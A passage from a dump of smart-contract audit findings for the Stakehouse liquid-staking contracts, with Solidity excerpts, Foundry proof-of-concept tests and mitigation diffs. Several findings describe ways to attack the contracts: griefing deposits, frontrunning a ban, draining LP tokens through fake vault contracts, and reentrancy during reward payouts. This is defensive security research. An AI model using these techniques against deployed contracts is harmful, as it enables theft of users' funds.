new caller  - The second sender will get the funds of the first contract  ### Tools Used  Review  ### Recommended Mitigation Steps  ```diff +    error ReturnDustFail(); +      function _returnDust() private {          uint256 _remainingETH = remainingETH; +        bool success;          assembly {              if gt(_remainingETH, 0) { -                let callStatus := call( +                success := call(                      gas(),                      caller(),                      selfbalance(),                      0,                      0,                      0,                      0                  )              }          } +        if (!success) revert ReturnDustFail();      } ```"}, {"title": "Medium: Vaults can be griefed to not be able to be used for deposits", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/422", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-31"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L111   # Vulnerability details  ## Description  Interaction with SavETHVault and StakingFundsVault require a minimum amount of MIN_STAKING_AMOUNT. In order to be used for staking, there needs to be 24 ETH or 4 ETH for the desired BLS public key in those vaults. The issue is that vaults can be griefed and made impossible to use for depositing by constantly making sure the *remaining* amount to be added to complete the deposit to the maxStakingAmountPerValidator, is under MIN_STAKING_AMOUNT.  In \\_depositETHForStaking: ``` function _depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount, bool _enableTransferHook) internal {     require(_amount >= MIN_STAKING_AMOUNT, \"Min amount not reached\");     require(_blsPublicKeyOfKnot.length == 48, \"Invalid BLS public key\");     // LP token issued for the KNOT     // will be zero for a new KNOT because the mapping doesn't exist     LPToken lpToken = lpTokenForKnot[_blsPublicKeyOfKnot];     if(address(lpToken) != address(0)) {         // KNOT and it's LP token is already registered         // mint the respective LP tokens for the user         // total supply after minting the LP token must not exceed maximum staking amount per validator         require(lpToken.totalSupply() + _amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");         // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied         lpToken.mint(msg.sender, _amount);         emit LPTokenMinted(_blsPublicKeyOfKnot, address(lpToken), msg.sender, _amount);     }     else {           // check that amount doesn't exceed max staking amount per validator         require(_amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");     ...      ```   MED - Can grief vaults (SavETHVault, StakingFundsVault) and make them not able to be used for staking by depositing so that left to stake is < MIN_STAKING_AMOUNT. Then it will fail maxStakingAmount check @ _depositEthForStaking  ## Impact  Vaults can be griefed to not be able to be used for deposits  ## Proof of Concept  1. savETHVault has 22 ETH for some validator 2. Attacker deposits 1.9991 ETH to the savETHVault 3. vault now has 23.9991 ETH. The remaining to complete to 24 is 0.0009 ETH which is under 0.001 ether, min staking amount 4. No one can complete the staking  Note that depositers may try to remove their ETH and redeposit it to complete the deposit to 24. However attack may still keep the delta just under MIN_STAKING_AMOUNT.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Handle the case where the remaining amount to be completed is smaller than MIN_STAKING_AMOUNT, and allow the deposit in that case."}, {"title": "Medium: User receives less rewards than they are eligible for if first passed BLS key is inactive", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/410", "labels": ["bug", "2 (Med Risk)", "judge review requested", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-29"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L224   # Vulnerability details  ## Description  StakingFundsVault has the claimRewards() function to allow users to withdraw profits.  ``` function claimRewards(     address _recipient,     bytes[] calldata _blsPubKeys ) external nonReentrant {     for (uint256 i; i < _blsPubKeys.length; ++i) {         require(             liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPubKeys[i]) == false,             \"Unknown BLS public key\"         );         // Ensure that the BLS key has its derivatives minted         require(             getAccountManager().blsPublicKeyToLifecycleStatus(_blsPubKeys[i]) == IDataStructures.LifecycleStatus.TOKENS_MINTED,             \"Derivatives not minted\"         );         if (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {             // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract             // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched             _claimFundsFromSyndicateForDistribution(                 liquidStakingNetworkManager.syndicate(),                 _blsPubKeys             );             // Distribute ETH per LP             updateAccumulatedETHPerLP();         }         // If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETH         LPToken token = lpTokenForKnot[_blsPubKeys[i]];         require(address(token) != address(0), \"Invalid BLS key\");         require(token.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Last transfer too recent\");         _distributeETHRewardsToUserForToken(msg.sender, address(token), token.balanceOf(msg.sender), _recipient);     } } ```  The issue is that updateAccumulatedETHPerLP() is not guaranteed to be called, which means the ETH reward distribution in \\_distribute would use stale value, and users will not receive as many rewards as they should. `updateAccumulatedETHPerLP` is only called if the first BLS public key is part of the syndicate. However, for the other keys it makes no reason not to use the up to date accumulatedETHPerLPShare value.  ## Impact  User receives less rewards than they are eligible for if first passed BLS key is inactive.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Call updateAccumulatedETHPerLP() at the start of the function."}, {"title": "MED: Funds are not claimed from syndicate for valid BLS keys of first key is invalid (no longer part of syndicate).", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/408", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-28"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code   https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L218   # Vulnerability details  ## Description  claimRewards in StakingFundsVault.sol has this code: ``` if (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {     // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract     // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched     _claimFundsFromSyndicateForDistribution(         liquidStakingNetworkManager.syndicate(),         _blsPubKeys     );     // Distribute ETH per LP     updateAccumulatedETHPerLP(); } ```  The issue is that if the first BLS public key is not part of the syndicate, then \\_claimFundsFromSyndicateForDistribution will not be called, even on BLS keys that are eligible for syndicate rewards. This leads to reduced rewards for user.  This is different from a second bug which discusses the possibility of using a stale acculmulatedETHPerLP.  ## Impact  Users will not receive rewards for claims of valid public keys if first passed key is not part of syndicate.  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  Drop the i==0 requirement, which was intended to make sure the claim isn't called multiple times. Use a hasClaimed boolean instead."}, {"title": "rotateNodeRunnerOfSmartWallet is vulnerable to a frontrun attack", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/386", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-27"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L369   # Vulnerability details  ## Impact As the `rotateNodeRunnerOfSmartWallet` function can be called by anyone who is a node runner in the LSD network, this function is vulnerable to a frontrun attack in the case of this node runner being malicious.  ## Proof of Concept If that is the current node runner is malicious, the DAO would purposely call this same `rotateNodeRunnerOfSmartWallet` with the `_wasPreviousNodeRunnerMalicious` flag turned on. An actual node runner that has been malicious could monitor the mempool and frontrun the DAO transaction that wanted to slash it and submit the transaction before the DAO to avoid getting banned and rotate their EOA representation of the node.  ```solidity if (msg.sender == dao && _wasPreviousNodeRunnerMalicious) {     bannedNodeRunners[_current] = true;     emit NodeRunnerBanned(_current); } ```  When the DAO transaction would go through, it would revert when it's checking if the current (old) node representative is still a wallet, but it's not because the mapping value has been deleted before.  ```solidity address wallet = smartWalletOfNodeRunner[_current]; require(wallet != address(0), \"Wallet does not exist\"); ```  ## Tools Used Manual inspection  ## Recommended Mitigation Steps Restrict this function to DAO only with the `onlyDAO` modifier.  ```solidity // - function rotateNodeRunnerOfSmartWallet(address _current, address _new, bool _wasPreviousNodeRunnerMalicious) external { + function rotateNodeRunnerOfSmartWallet(address _current, address _new, bool _wasPreviousNodeRunnerMalicious) onlyDAO external {     require(_new != address(0) && _current != _new, \"New is zero or current\");      address wallet = smartWalletOfNodeRunner[_current];     require(wallet != address(0), \"Wallet does not exist\");     require(_current == msg.sender || dao == msg.sender, \"Not current owner or DAO\");      address newRunnerCurrentWallet = smartWalletOfNodeRunner[_new];     require(newRunnerCurrentWallet == address(0), \"New runner has a wallet\");      smartWalletOfNodeRunner[_new] = wallet;     nodeRunnerOfSmartWallet[wallet] = _new;      delete smartWalletOfNodeRunner[_current];      // - if (msg.sender == dao && _wasPreviousNodeRunnerMalicious) {     if (_wasPreviousNodeRunnerMalicious) {         bannedNodeRunners[_current] = true;         emit NodeRunnerBanned(_current);     }      emit NodeRunnerOfSmartWalletRotated(wallet, _current, _new); }"}, {"title": "Incorrect checking in _assertUserHasEnoughGiantLPToClaimVaultLP", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/382", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-25"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L93-L97   # Vulnerability details  ## Impact The batch operations of `withdrawDETH()` in GiantSavETHVaultPool.sol and `withdrawLPTokens()` in GiantPoolBase.sol are meaningless because they will fail whenever more than one lpToken is passed. Each user can perform `withdrawDETH()` or `withdrawLPTokens()` with one LPToken only once a day.  ## Proof of Concept  Both the `withdrawDETH()` in GiantSavETHVaultPool.sol and `withdrawLPTokens()` in GiantPoolBase.sol will call `GiantPoolBase._assertUserHasEnoughGiantLPToClaimVaultLP(lpToken, amount)` and `lpTokenETH.burn(msg.sender, amount)`:  There is a require in `_assertUserHasEnoughGiantLPToClaimVaultLP()`: ``` require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, \"Too new\"); ```  At the same time, `lpTokenETH.burn(msg.sender, amount)` will update `lastInteractedTimestamp[msg.sender]` to latest block timestamp in `_afterTokenTransfer()` of GiantLP.sol.  So, a user can perform `withdrawDETH` or `withdrawLPTokens` of one LPToken only once a day, others more will fail by `_assertUserHasEnoughGiantLPToClaimVaultLP()`.  ## Tools Used VS Code  ## Recommended Mitigation Steps  The LPToken being operated on should be checked for lastInteractedTimestamp rather than lpTokenETH.  ``` diff --git a/contracts/liquid-staking/GiantPoolBase.sol b/contracts/liquid-staking/GiantPoolBase.sol index 8a8ff70..5c009d9 100644 --- a/contracts/liquid-staking/GiantPoolBase.sol +++ b/contracts/liquid-staking/GiantPoolBase.sol @@ -93,7 +93,7 @@ contract GiantPoolBase is ReentrancyGuard {      function _assertUserHasEnoughGiantLPToClaimVaultLP(LPToken _token, uint256 _amount) internal view {          require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");          require(_token.balanceOf(address(this)) >= _amount, \"Pool does not own specified LP\"); -        require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, \"Too new\"); +        require(_token.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, \"Too new\");      }       /// @dev Allow an inheriting contract to have a hook for performing operations post depositing ETH ```  "}, {"title": "Node runner who is already known to be malicious cannot be banned before corresponding smart wallet is created", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/381", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-24"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L507-L509 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492   # Vulnerability details  ## Impact Currently, the `rotateNodeRunnerOfSmartWallet` function provides the only way to set `bannedNodeRunners` to `true` for a malicious node runner. However, before the node runner calls the `registerBLSPublicKeys` function to create a smart wallet, calling the `rotateNodeRunnerOfSmartWallet` function reverts. This means that for a node runner, who is already known to be malicious such as someone controlling a hacker address, calling the `isNodeRunnerBanned` function always return `false` before the `registerBLSPublicKeys` function is called for the first time, and executing `require(isNodeRunnerBanned(msg.sender) == false, \"Node runner is banned from LSD network\")` when calling the `registerBLSPublicKeys` function for the first time is not effective. As the monitoring burden can be high, the malicious node runner could interact with the protocol maliciously for a while already after the `registerBLSPublicKeys` function is called until the DAO notices the malicious activities and then calls the `rotateNodeRunnerOfSmartWallet` function. When the DAO does not react promptly, some damages to the protocol could be done already.  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377 ```solidity     function rotateNodeRunnerOfSmartWallet(address _current, address _new, bool _wasPreviousNodeRunnerMalicious) external {         ...          if (msg.sender == dao && _wasPreviousNodeRunnerMalicious) {             bannedNodeRunners[_current] = true;             emit NodeRunnerBanned(_current);         }          ...     } ```  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L507-L509 ```solidity     function isNodeRunnerBanned(address _nodeRunner) public view returns (bool) {         return bannedNodeRunners[_nodeRunner];     } ```  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492 ```solidity     function registerBLSPublicKeys(         bytes[] calldata _blsPublicKeys,         bytes[] calldata _blsSignatures,         address _eoaRepresentative     ) external payable nonReentrant {         ...         require(isNodeRunnerBanned(msg.sender) == false, \"Node runner is banned from LSD network\");          address smartWallet = smartWalletOfNodeRunner[msg.sender];          if(smartWallet == address(0)) {             // create new wallet owned by liquid staking manager             smartWallet = smartWalletFactory.createWallet(address(this));             emit SmartWalletCreated(smartWallet, msg.sender);              // associate node runner with the newly created wallet             smartWalletOfNodeRunner[msg.sender] = smartWallet;             nodeRunnerOfSmartWallet[smartWallet] = msg.sender;              _authorizeRepresentative(smartWallet, _eoaRepresentative, true);         }          ...     } ```  ## Proof of Concept Please add the following test in `test\\foundry\\LSDNFactory.t.sol`. This test will pass to demonstrate the described scenario. ```solidity     function testMaliciousNodeRunnerCannotBeBannedBeforeCorrespondingSmartWalletIsCreated() public {         vm.prank(address(factory));         manager.updateDAOAddress(admin);          // Simulate a situation where accountOne is known to be malicious already.         // accountOne is not banned at this moment.         assertEq(manager.bannedNodeRunners(accountOne), false);          // Calling the rotateNodeRunnerOfSmartWallet function is the only way to ban accountOne;         //   however, calling it reverts because accountOne has not called the registerBLSPublicKeys function to create a smart wallet yet.         // This means that it is not possible to prevent accountOne from interacting with the protocol until her or his smart wallet is created.         vm.prank(admin);         vm.expectRevert(\"Wallet does not exist\");         manager.rotateNodeRunnerOfSmartWallet(accountOne, accountTwo, true);     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps A function, which should be only callable by the DAO, that can directly set `bannedNodeRunners` for a node runner can be added."}, {"title": "Calling `updateNodeRunnerWhitelistStatus` function always reverts", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/378", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-23"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L278-L284 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L684-L692 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492   # Vulnerability details  ## Impact Calling the `updateNodeRunnerWhitelistStatus` function by the DAO supposes to allow the trusted node runners to use and interact with the protocol when `enableWhitelisting` is set to `true`. However, since calling the `updateNodeRunnerWhitelistStatus` function executes `require(isNodeRunnerWhitelisted[_nodeRunner] != isNodeRunnerWhitelisted[_nodeRunner], \"Unnecessary update to same status\")`, which always reverts, the DAO is unable to whitelist any trusted node runners. Because none of them can be whitelisted, all trusted node runners cannot call functions like `registerBLSPublicKeys` when the whitelisting mode is enabled. As the major functionalities become unavailable, the protocol's usability becomes much limited, and the user experience becomes much degraded.  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L278-L284 ```solidity     function updateNodeRunnerWhitelistStatus(address _nodeRunner, bool isWhitelisted) external onlyDAO {         require(_nodeRunner != address(0), \"Zero address\");         require(isNodeRunnerWhitelisted[_nodeRunner] != isNodeRunnerWhitelisted[_nodeRunner], \"Unnecessary update to same status\");          isNodeRunnerWhitelisted[_nodeRunner] = isWhitelisted;         emit NodeRunnerWhitelistingStatusChanged(_nodeRunner, isWhitelisted);     } ```  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L684-L692 ```solidity     function _isNodeRunnerValid(address _nodeRunner) internal view returns (bool) {         require(_nodeRunner != address(0), \"Zero address\");          if(enableWhitelisting) {             require(isNodeRunnerWhitelisted[_nodeRunner] == true, \"Invalid node runner\");         }          return true;     } ```  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492 ```solidity     function registerBLSPublicKeys(         bytes[] calldata _blsPublicKeys,         bytes[] calldata _blsSignatures,         address _eoaRepresentative     ) external payable nonReentrant {         ...         require(_isNodeRunnerValid(msg.sender) == true, \"Unrecognised node runner\");         ...     } ```  ## Proof of Concept Please add the following test in `test\\foundry\\LSDNFactory.t.sol`. This test will pass to demonstrate the described scenario. ```solidity     function testCallingUpdateNodeRunnerWhitelistStatusFunctionAlwaysReverts() public {         vm.prank(address(factory));         manager.updateDAOAddress(admin);          vm.startPrank(admin);          vm.expectRevert(\"Unnecessary update to same status\");         manager.updateNodeRunnerWhitelistStatus(accountOne, true);          vm.expectRevert(\"Unnecessary update to same status\");         manager.updateNodeRunnerWhitelistStatus(accountTwo, false);          vm.stopPrank();     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L280 can be updated to the following code.  ```solidity         require(isNodeRunnerWhitelisted[_nodeRunner] != isWhitelisted, \"Unnecessary update to same status\"); ```"}, {"title": "ETH sent when calling `executeAsSmartWallet` function can be lost", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/377", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-22"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L202-L215 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/smart-wallet/OwnableSmartWallet.sol#L52-L64   # Vulnerability details  ## Impact Calling the `executeAsSmartWallet` function by the DAO further calls the `OwnableSmartWallet.execute` function. Since the `executeAsSmartWallet` function is `payable`, an ETH amount can be sent when calling it. However, since the sent ETH amount is not forwarded to the smart wallet contract, such sent amount can become locked in the `LiquidStakingManager` contract. For example, when the DAO attempts to call the `executeAsSmartWallet` function for sending some ETH to the smart wallet so the smart wallet can use it when calling its `execute` function, if the smart wallet's ETH balance is also higher than this sent ETH amount, calling the `executeAsSmartWallet` function would not revert, and the sent ETH amount is locked in the `LiquidStakingManager` contract while such amount is deducted from the smart wallet's ETH balance for being sent to the target address. Besides that this is against the intention of the DAO, the DAO loses the sent ETH amount that becomes locked in the `LiquidStakingManager` contract, and the node runner loses the amount that is unexpectedly deducted from the corresponding smart wallet's ETH balance.  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L202-L215 ```solidity     function executeAsSmartWallet(         address _nodeRunner,         address _to,         bytes calldata _data,         uint256 _value     ) external payable onlyDAO {         address smartWallet = smartWalletOfNodeRunner[_nodeRunner];         require(smartWallet != address(0), \"No wallet found\");         IOwnableSmartWallet(smartWallet).execute(             _to,             _data,             _value         );     } ```  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/smart-wallet/OwnableSmartWallet.sol#L52-L64 ```solidity     function execute(         address target,         bytes memory callData,         uint256 value     )         external         override         payable         onlyOwner // F: [OSW-6A]         returns (bytes memory)     {         return target.functionCallWithValue(callData, value); // F: [OSW-6]     } ```  ## Proof of Concept Please add the following code in `test\\foundry\\LSDNFactory.t.sol`.  1. Add the following `receive` function for the POC purpose. ```solidity     receive() external payable {} ```  2. Add the following test. This test will pass to demonstrate the described scenario. ```solidity     function testETHSentWhenCallingExecuteAsSmartWalletFunctionCanBeLost() public {         vm.prank(address(factory));         manager.updateDAOAddress(admin);          uint256 nodeStakeAmount = 4 ether;         address nodeRunner = accountOne;         vm.deal(nodeRunner, nodeStakeAmount);          address eoaRepresentative = accountTwo;          vm.prank(nodeRunner);         manager.registerBLSPublicKeys{value: nodeStakeAmount}(             getBytesArrayFromBytes(blsPubKeyOne),             getBytesArrayFromBytes(blsPubKeyOne),             eoaRepresentative         );          // Before the executeAsSmartWallet function is called, the manager contract owns 0 ETH,         //   and nodeRunner's smart wallet owns 4 ETH.          assertEq(address(manager).balance, 0);         assertEq(manager.smartWalletOfNodeRunner(nodeRunner).balance, 4 ether);          uint256 amount = 1.5 ether;          vm.deal(admin, amount);          vm.startPrank(admin);          // admin, who is dao at this moment, calls the executeAsSmartWallet function while sending 1.5 ETH         manager.executeAsSmartWallet{value: amount}(nodeRunner, address(this), bytes(\"\"), amount);          vm.stopPrank();          // Although admin attempts to send the 1.5 ETH through calling the executeAsSmartWallet function,         //   the sent 1.5 ETH was not transferred to nodeRunner's smart wallet but is locked in the manager contract instead.         assertEq(address(manager).balance, amount);          // Because nodeRunner's smart wallet owns more than 1.5 ETH, 1.5 ETH of this smart wallet's ETH balance is actually sent to address(this).         assertEq(manager.smartWalletOfNodeRunner(nodeRunner).balance, 4 ether - amount);     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L210-L214 can be updated to the following code.  ```solidity         IOwnableSmartWallet(smartWallet).execute{value: msg.value}(             _to,             _data,             _value         ); ```"}, {"title": "`bringUnusedETHBackIntoGiantPool` in `GiantMevAndFeesPool` can be used to steal `LPTokens`", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/366", "labels": ["bug", "3 (High Risk)", "judge review requested", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-21"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126   # Vulnerability details  ## Impact real `LPTokens` can be transferred out of `GiantMevAndFeesPool` through fake `_stakingFundsVaults` provided by an attacker. https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126  ## Proof of Concept `bringUnusedETHBackIntoGiantPool` takes in `_stakingFundsVaults`, `_oldLPTokens`, `_newLPTokens` and rotate `_amounts` from old to new tokens. The tokens are thoroughly verified by `burnLPForETH` in `ETHPoolLPFactory`.  However, theres is no checking for the validity of `_stakingFundsVaults`, nor the relationship between `LPTokens` and `_stakingFundsVaults`. Therefore, an attacker can create fake contracts for `_stakingFundsVaults`, with `burnLPTokensForETH`, that takes `LPTokens` as parameters. The `msg.sender` in `burnLPTokensForETH` is `GiantMevAndFeesPool`, thus the attacker can transfer `LPTokens` that belongs to `GiantMevAndFeesPool` to any addresses it controls.  ## Tools Used manual  ## Recommended Mitigation Steps Always passing liquid staking manager address, checking its real and then requesting either the savETH vault or staking funds vault is a good idea to prove the validity of vaults.  "}, {"title": "Possibly reentrancy attacks in `_distributeETHRewardsToUserForToken` function", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/328", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-20"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L73 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340   # Vulnerability details  ### Author: rotcivegaf  ### Impact  The root of the problem are in the `_distributeETHRewardsToUserForToken` who makes a call to distribute the ether rewards. With this call the recipient can execute an reentrancy attack calling several times the different function to steal founds or take advantage of other users/protocol  ### Proof of Concept  This functions use the `_distributeETHRewardsToUserForToken`:  #### [`beforeTokenTransfer`, **GiantMevAndFeesPool** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167):  The contract **GiantLP** use the **GiantMevAndFeesPool** contract as [`transferHookProcessor`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L14) and when use the functions [`_mint`, `_burn`, `transferFrom` and `transfer` of the ERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.7/contracts/token/ERC20/ERC20.sol), the function [`beforeTokenTransfer`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167) implemented in the **GiantMevAndFeesPool** bring a possibility to make a reentrancy attack because in the function [`_distributeETHRewardsToUserForToken`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L73) implemented in the [**GiantMevAndFeesPool** make a `call` to the `_recipient`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L67-L68)  A contract can call the function `transfer` of **GiantLP** contract several time, transfer an `amount` from and to self, as the update of the [`claimed`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L203) would not be done until, it is executed the function [`_afterTokenTransfer`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L43-L47) of the **GiantLP** contract, the [`due`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61) amount calculated in `_distributeETHRewardsToUserForToken` of **SyndicateRewardsProcessor** contract and the `lastInteractedTimestamp` of **GiantLP** contract will be incorrect  ### [`withdrawLPTokens`, **GiantPoolBase** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90):  The possibility of the reentrancy is given when call function [`_onWithdraw`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L74), this function implemented in [**GiantMevAndFeesPool** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L181-L193) uses `_distributeETHRewardsToUserForToken` and this one call the recipient making the possibility of the reentrancy, breaking the code of [L76-L89](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L76-L89)  ### [`batchDepositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104):  The possibility of the reentrancy is given when call function [`_distributeETHRewardsToUserForToken`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L88-L93), this function call the recipient making the possibility of the reentrancy, 